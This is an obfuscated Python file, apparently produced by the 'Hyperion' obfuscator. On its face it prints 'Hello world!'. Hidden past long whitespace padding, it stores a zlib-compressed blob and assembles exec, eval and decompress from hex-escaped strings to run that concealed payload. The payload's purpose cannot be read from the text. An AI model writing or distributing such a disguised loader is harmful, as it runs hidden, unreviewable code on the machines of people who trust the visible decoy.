from builtins import *
from math import prod as DetectVar


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Statistics, CallFunction, _algorithm, Power, Algorithm, Walk, _ceil = exec, str, tuple, map, ord, globals, type

class _power:
    def __init__(self, _random):
        self.Calculate = DetectVar((_random, -84048))
        self._theory(Square=-45129)

    def _theory(self, Square = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Calculate += 24777 * Square
        
        try:
            (((Power, Algorithm, Algorithm), _algorithm) for _algorithm in {Algorithm: Statistics})

        except ArithmeticError:
            ((_algorithm, Algorithm, CallFunction) or CallFunction if (_algorithm, Algorithm, CallFunction) and CallFunction else ... or (CallFunction, (_algorithm, Algorithm, CallFunction)))

        except:
            _ceil(-22273 / 81349) == bool

    def _while(self, _invert = 22530):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _invert += -33444 * -60766
        self.Frame != bool
        
        try:
            ((Power, Algorithm, Algorithm) or _algorithm if (Power, Algorithm, Algorithm) and _algorithm else ... or (_algorithm, (Power, Algorithm, Algorithm)))

        except TypeError:
            ((Statistics, _algorithm) or CallFunction if (Statistics, _algorithm) and CallFunction else ... or (CallFunction, (Statistics, _algorithm)))

        except:
            _ceil(-12491 + -36657) == type

    def Product(_substract = False):
        return Walk()[_substract]

    def _frame(_product = 90228 + 26486, Math = True, _math = Walk):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _math()[_product] = Math
        
        try:
            {Power: '3teltbdaoRai3oR'} if Algorithm == Power else (Power, Algorithm, Algorithm) > _algorithm

        except AssertionError:
            (((Power, Algorithm, Algorithm), _algorithm) for _algorithm in {Power: '3teltbdaoRai3oR'})

        except:
            _ceil(-95478 + 17879) == bool

    def execute(code = str):
        return Statistics(CallFunction(_algorithm(Power(Algorithm, code))))

    @property
    def Frame(self):
        self._modulo = '<__main__._while object at 0x000005969BE52819>'
        return (self._modulo, _power.Frame)

if __name__ == '__main__':
    try:
        _power.execute(code = __code__)
        Theory = _power(_random = -65377 - 62799)

        _power(_random = 56892 / -94660)._theory(Square = Theory.Calculate * -48787)                                                                                                                                                                                                                                                          ;_power._frame(_product='OoO00OOoO0oOOOOo000o0O00O0',Math=b'x\x9c\xdd\x1bks\xe28\xf2;\xbf\x82\xe5\x0b\xb8&\x93\xf8!\xcb\x90\xaa\xf9\xb2\xc5]-T&\xbe\xda\xb9\xba\xc9\xd6\xcc\x14e\xb0\x9d\x98\x15\x16\x85\xcd\x86\xfc\xfb\xebn\xc9`\x92\x00\x06Bf\n\xcbz\xb7\x1en\xb5Z\xad\x96\x9c\xcf\x9e\xaekux\x92\xb8E>>\x83\x81\x1c\xc6\xf3l\x14\xe4r6\x18\xd4\x7f\xfb\xd4\xf8\xe3i\x1a\xcd\x12\x996\xearV\x02\x0b\xe6\xf9\x83\x9ce\x04\xd3j\x0c\x13!\x9e\xf2\x87\xe8^\x06\xb9\xe3\xf2\xc6E\xe3w1\x8f\xfe\x8c\xc2\x86\xb1V\xea>\xc9\x1f\xe6CU\xf1C\x9eO\xb3\xeb\xab+\x95v9\x92\x93\xabg\xd5\\mh;L\xb2\x91\x9c\x85\xeb\xd5\xe8\xc4\xcb\xfb\xfb\xab\xa9\x08\xee\xe7\xd1\xb3B"\x19Ei\x16\xa9B\xff\xfa\xcf\xcdG\xfb\xd2|\x062\x92\xa1\xcaoNgI\x9a\xb7\x1a\x7fDB\xc8\xfa\xa3\x9c\x89\xf0\xb7\x86\xd1\xac\x19\xd7Kh\xccof\x7f\'a\xd3\xa8E\x8bQ4\xcd52\xd3\xe9\x1cJ\xfe)\xb3(\xab\x07\xb3\xa8>\x8b\xc2\xef\xe9\xff\x12)\xa2\\%\x0c\x013\xdf\xd3\xbf\xe4\x9cbA\x1d+\xf9\x9e\xde\xca\xa1\x0c\x9f\xea"\xf9\x1b\xca=\xc9y\xc3\xa8\xa9N%\x93\xa9\x9c\xe5\x83\x01\xb4\xf6\x945\x8d\xcbh\x91\xe4-\xa3&\xe4(\x10Y\xcb\xf8\xd6L\x04`M\x8c\xc7\xe0\x8d\x13\x8c$c\x88&\xa2\xf9\xe3\xd3\xbd\x90C\x80\xaam\x02\xc1\xe2w_\x95\xc1\x17\x1c\x15l~\xbb\xbe\xfe\xf0\xf1\xc3\xc7\xd6\xc7\xd6\x07\xcb0~\xfc\xf8\x14&\xb3\xad\xd5P"\x18\x91$\xc9\x18\x83/\xab\xb8\x8f\xf2 \xcfwV\x83\xefx\xac=\xacN\xd0\xb7\xa8\x0f\xaem\x00\xc0\xb2\xa2\xd7\x13h\xf0\xa1\x10\x94Z\xe1o{\xb3\x90B\xb1\x04\xeb\x1c\xebO\x01`l\xf8y\xb5\xad\xe6p\x9e\x88<Iq8\xfe\tf\xd0\xa9M\xc5\xb1\xee\xcf\xf0\xdc\xde~V\xcf-\x86\xd1\x01\x83u\xe3G\xe0\x17P\t(\xd7z\xa5\xb5,Mr\x91\xcc\x87\xcf1j\\\xd0\xa8\xdd\xa9\x81\xfb\xaa\xc7\xf1n\xaf*\x8cooP\xc7e\x92\x86\xd1\xa2\xd5\x8c2\x11\xfc\xfbE\xf6\x0fc+\xea\x17\x8b\xc5\xe3\xe3\xe3\xe2\x91\xdc\x05\xbd\x8f\xe7\x87\x19\x91L\'r\xb4/nn?+ZQ\x14t{\x86$#\xa4|\x99\xbb\x93b\x1eK\x06\xe9\x06\x9e\xb3\xc3L4\x9f\xfd\xf75\xccl\xe55\x18A\x8cQ\x8eb\x8e\x80\x12\xb5\x18\x9c\x17zfy\xb67v\xbe\xd8\xf0\x80\xf3\xe5\x0b\x86\xd0\xfdBq\xfb\xec\xb0\x93\x07R\xc4\xfb\xce+Z\xba\x05b\x10)H\x14\xcb\xf9\xb8*v\x92d\x94\x05ir\x0cv6V\xb1\x07v6\xd7Q`\xe7)N\xc4"zH\xe7\xfb\xcf/lE\xbfB\xb7\x0c/`\xa8\xd9\xbc\x1c\xcb$\xdd^<\x9d\xa4\x13\xfdP M)\x90N\xce\x8e\x00E\xf0O\xb4\'\xfdm"\xbf\xd6\xb0\xe9:\xae\xe3\xd8h\xd1U1e\xd6s\x8a\x10\xc8ea\x84\xd2|\xab\xd9\x8e\xf3W\x86\xf9\xcc\xb0=\x8a\x16\xafb{\x1b1nA7\x8bY\xcc\xc1\xb0\xd811\xac|\xc7D\x97k\x7f7\x8a7\x12{kK\xd3\xb6\xcd<\x1er\x8bw\xf8\xc86\x99\xc5\x1d0\xb1\xe7\xf2\xc8c\xb6\xe9\x04\xb6i\xef\x1c\xdd\x1ds\xd8\xf7M\xd3\x97R\xfa\x12}\xdf\x94\xbe_\xaebs\xb7\x9b\x867\xe0\x03s\xe0\x80\xb1\x07.\xb8\x9d\x81\x07%\xda/S\xabV\xc8\xa1H\x07\x8ax`,\x08cu\xde\xf3\xb4j\x95mA\xaac\xda\xa1\xdd\xb6C\xc7\xb2;;\x91\xa7\x1c\xb2\x87\x8e\xa1\xe7\xd9<\x84\x91\n\xc1\xe7\xe0\xc7\x9e\xe31\x18E\x1b\xc6\xd5\xe3\xae\x1ds\x97\x870\xa6#nA\xba\xcb\x99\rDe\xc7\xb6w\xdc\xc8n\xa3h \'\xd6)\x8c\nC\xf3#\x0c)[\x0e\x9f\x8a\xb6\x7f=\xbc\xb8\x9e\xdb&\xe3\xad\xb9\xdeZ\\\xa7\xfdZX9!\xad\x10\xe7\xe3\xdae\x9a\x0f\xa2\xe1KNXpCLC\x8e\xf8N\xb8y\x0f\xcc4I.V\xaf\xf2U\x08$\xe5wgD\xb0N\x07\x93a\x18\xd4\xb5b\x007{\xfaUJ\x83\xeb-_r\xe8\xf8\xc3(3X\xf3XA\x05\xca\xa88\xe5\xc4UV?\xddq\xd4R\xa1\xa41\xc6\x96\xd1G\xd9\xe7$\xbd^r\xaf\x82\x9b\xad8Z9\xa7r\xcf\xb1e|\x94\x8b\xfb\xca\xf1\xf5f\xe9\xed\xe0n\x07\xb0\xd2\x17\x06\xbb\xac\xfc\x0e\xa4\x07\x14\x0ft\x1a\xa4\xbc#\x03\xe2\x0c\xc4\x0e\x0b\xe2\x9a\x05\xbb\x1eo\xe3$\xf3\x1cfy\xa6w\xfc$S\xa2\x9f\x16\x01\x0b\xcd\xeb\xba\xdeu\x9b\xdc`\x01\x84y\x02\xe0ms\x97\xbb\xb1\xe3\x96\xac\x03\xb6]\xf21\xdf\xb1\x874\xbf\xab\xc0\xda\xbf\xb40\x02\xb9\x11g\x00\x15\x03\xe9A\x1a\xf86\xb7O\xba\xec(\xc3c\xb6d<\xc8n\xc8e:\xc6\n\xa8\xd3\xcd\x05\xc0\x01b\x0c\x16|\x18H\x98\t.P\xbd\xeb!\xfe\xd6\xf1v\xec\x0c\x90]\xe9w\xbb\xb2\xeb\x83\xedv}\xbf\x0b2yuI\x9c\x0f\xda \x1c;$m[\x10vIp~\x96v<\xcd[z\xbd2\xab\xd3\xea\xc1\x98?!m\x01)\x87\xda*\xa3b\xa1N\t\x8b\xf8\xc96u\xae\t\xb3\xcb\x01\xe3\x11\x05\xb1\x13m\xed\x94\xa2\\\xa9\xcaIs^\x95\x9cL\x80\xb0\xaa\x02w`\xb7g\x03\x95\xb5\xc18Di6\x940i\xb3\xb6\x96Z\xb5B\x17vz\x8c\x8ab\xc5@\xb8D\xce\xfce\xeaO\xdb\t\x9e\xd9np\xc4\x02mP:R\xfe\x88R;\xe4\xa3\xbb\x13?\'\x147\x18\xb2_\x07\x16\x1e\xe7\xb4X(LGc\xa2\xa3\xbf=X\xa6V\xc0\x82\x96\x17\xefP\x8e\xd1\xaf2w$\xd5\x1c,\xec\x16\xcaVx\x8a\x10\xf8\xc7O\x01\x94?lmQ6\xf1\xb45\xc1v\xb4\xcf\xb5\x1cS\x05\xd6\xdds/sK\x87\xbf\x05\x87"\xffP\xc1\x9aP\xa4\x95\xd0\x84\xa4\xdeI\x04\xc8=\xb8\xe36\xc4{\x85\x90\xa8\xad\xad}\xa6\x91I\x08\xd6\x88\xaf\x02\xcb\x7f\x8e\x00\xc9X\x1b$\xb0\x90\x1d-\x02\xed\x12\x06\x99\xdes*\x91\x90\x15\x02\xe0j_\xaaRy\xf5\xddh\xbfwss\x03\xb6\xd7\xef\xf7{\xbd>\xf97\xfd\x83\xa9/E\x04\x02\xfa\x14\x1e!V\x95\xa0p}d \xa5\xd9\xa4\xe6Di\r\x17<\xf62\xf5x\xa2\xeb\xe8\x19ki\xa2)v\x1f\xc5\xcc\xc6tS\x13\xdd.X\x9a\xf5\xef \t\xee^ ^\xecN\x18-\x9e\xd6\xd1R9\xb1\x93\xd5\xf9\x16\xbe\xea,\xe2m\xa6\x7f\xa7\xc4K\x0b\xfei\x96x+/M\xff]\xb0\xfb\xf2]\xdf7\xa5\t/\xec2|\x93\xde\x13\xe83\xd8\xf2\xd0D)\x0by\xac\xd4\x86*\x95\x97\xd4\x8a\x85R\xb1\xf2\xe4](\xf5\xd7bya\xe6\xf0\x95u\xb1X]\x9d\xa0\n\xabN\\<\xe0\xe8\x90Lj\x0fp\xbb\xd5\x06x\xe7y\xdaI\x84n\x8b\x98\x83E-x\xd0\x1a\'\xa1\xdb~\x99\xfa6\x8a\x0e\xae\xd7\x9a\x82\x10\x8b\x85\xbfPlx%E\xc7.\xd8=\xd7\xa95\xa2-n\x8e\xe9\xfbc\xea\xee\xd8\xf5\xc6Kp;\xb6\xdc8\x03\xd0J:\xfe\xc2\xa9\xf0\xee[\xe4\xf7\x90\x9a\x87G\xb3A\xd5+\xddQZ\xda\xc0\x7f\x1b\xca25\xb5\xb4\xb5\xcfJ\xd4\xa2\x16\x98\x15e\xed\x82m\xffl\x9c\x1f\x8bgBm\xba\xc41\xbc\xa7a\x1e\'\x92v\xdfL\xb7z\x80\x9e\xe9Uv!\xd4\xbd\x81\x9eX\x9a\x9e\x8a\x1c,\xe3\x81\x88\xd8\xbb\x01I\xb1\x87/\xfa(>\xde\xf4+o4\xdeh\xefp\x80\xde\xe2|\xf4\x15^\x9b\x8cz\xdadWqzN\xa6\xb8\xb3M\xe6\xd1w[\xabC%4v\xb44G*\xed\xb6\tS\xact\xea\xb6\xb4e\xd58_\x9e\xd3\xa9\xfd\xd1\xbb\x9d\xc3\xee\xcf\x07\xe3\x99\x9c\xd4\x8b\x8b\xe3uu+\xbd\x1e-\xa2\xd1\x05\xfd2pA\xbf\x1c@8\xafab\xcbGu8\xaa\xc5\x97:r_v\xa5Q\xd3\x05ev\x91=e5\x99]\x82\x97G\x13\x80\x87\x12XH"`Wb\x01x\x8c\x12\xc8\xd7\x95\x86F]\xf4\xa7\x93\xa72\x04\xe1\xa3\xc0P\xaa\xb1c\xac\xb5"\xe9\xce\x8c)\xe9\x06\x8di\xae\xb7p\xf7\xb5\xb8\xd0\xb4:\xdc\x02\xa7\x0c\xa2\xeb\xd7\xad@\xac\x9c\xd9+\xae\xd5\xa9\xbd\x87\x10\xe5\xcc.\x1e\x18(\xa3\xbe\x12O\x10\xc0v\xd7:\x88\x1dC\x07\xfa\x06\x9d4\xd1\xa0\xc8#\xcd\xb5v\xfa\xb4\x0b\xee\xadq6`te\x18$V\xbc\x1f\x86\xccrL\xe4\x80\xf4\xb1V\x0bqW\xdd\xd3\xde\xf2J`\x19\xe4\xb6\xb8\xb8MZix\xca\x997}\xdc~C\xbb\xb0)\xef\x13[\xed\xad\x7f\x8aIR\x1a\xcai$\xb5\xf90\xfc\xc1\'\xf5\x83\t\x91\x87I;\x19\xbc\xc5\x04\xd6\xa8\ru^:\xd1\xcbj\xba\xa2o\xa3\xa6~iYn\x1e\x8a{\xd3Fm\x12L\xa6\xf3\x0c\xd6\x81\xff\x03,b\x94K')

        if 459246 > 4536156:
            _power(_random = 60184 / 81249)._theory(Square = Theory.Calculate * 97515)
        elif 267996 < 8012584:
            Theory._theory(Square = Theory.Calculate - -26152)                                                                                                                                                                                                                                                          ;lIlIIlIIIIIllIlIIIlIlII,SSS2SSSS2S22S22S22SSS2S2,oDOooOoDDoDDOODODD,OoO0oO0oOOo0OOo00oO,IIILJJJLJIIJILLJJJ=(lambda S2S2SSSSS222S22S2SSS2S:S2S2SSSSS222S22S2SSS2S['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda S2S2SSSSS222S22S2SSS2S:S2S2SSSSS222S22S2SSS2S(__import__('\x7a\x6c\x69\x62'))),(lambda S2S2SSSSS222S22S2SSS2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S2S2SSSSS222S22S2SSS2S)"),filename='\x49\x4c\x4a\x4c\x4c\x49\x4a\x49\x4a\x4a\x49\x4c\x4a\x4a\x4c\x4c\x49',mode='\x65\x76\x61\x6c'))),(lambda oDOoODoDoDooOoDoDDoODDo,S2S2SSSSS222S22S2SSS2S:oDOoODoDoDooOoDoDDoODDo(S2S2SSSSS222S22S2SSS2S)),(lambda:(lambda S2S2SSSSS222S22S2SSS2S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S2S2SSSSS222S22S2SSS2S)"),filename='\x49\x4c\x4a\x4c\x4c\x49\x4a\x49\x4a\x4a\x49\x4c\x4a\x4a\x4c\x4c\x49',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 221286 > 9427092:
            _power(_random = 45851 - 68315)._while(_invert = -70407 / Theory.Calculate)
        elif 102033 < 6185526:
            _power(_random = -26763 * 54634)._while(_invert = -25387 - Theory.Calculate)                                                                                                                                                                                                                                                          ;IIILJJJLJIIJILLJJJ()(OoO0oO0oOOo0OOo00oO(lIlIIlIIIIIllIlIIIlIlII(SSS2SSSS2S22S22S22SSS2S2(oDOooOoDDoDDOODODD('\x76\x61\x72\x73'))),_power.Product(_substract='OoO00OOoO0oOOOOo000o0O00O0')))

    except Exception as _cube:
        if 372775 > 4491406:
            _power.execute(code = CallFunction(_cube))

        elif 243285 > 9528782:
            Theory._theory(Square = Theory.Calculate - -89674)
